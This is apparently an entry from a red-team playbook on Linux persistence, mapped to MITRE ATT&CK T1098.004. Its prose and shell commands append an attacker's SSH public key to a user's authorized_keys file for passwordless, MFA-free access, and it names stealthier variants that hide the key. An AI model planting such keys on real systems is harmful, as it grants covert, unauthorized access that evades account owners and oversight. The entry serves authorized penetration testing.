---
id: ssh-authkeys-persist
title: SSH authorized_keys persistence (append attacker key)
section: Linux persistence (authorized engagements only)
phase: Persistence
attack:
  tactic: TA0003
  techniques: [T1098.004]
platform: [linux]
source: MITRE ATT&CK T1098.004; SSH authorized_keys backdoor
pair: ssh-authkeys-auditd
---

The quietest Linux backdoor: append your public key to a user's
`~/.ssh/authorized_keys` and you own passwordless, MFA-free SSH as that account for as
long as the key stays — no new user, no new process, no payload on disk. Target root's
keys if you have them, else any user whose login is useful; the file is created if it
does not exist. A stealthier variant sidesteps the file entirely with
`AuthorizedKeysCommand` in `sshd_config`, or hides the key past a screenful of newlines.
Authorized persistence testing only — remove the key and document it.

```sh
# append the attacker key to the target account's authorized_keys
mkdir -p ~/.ssh && chmod 700 ~/.ssh
echo 'ssh-ed25519 AAAA...attacker <op>' >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
```
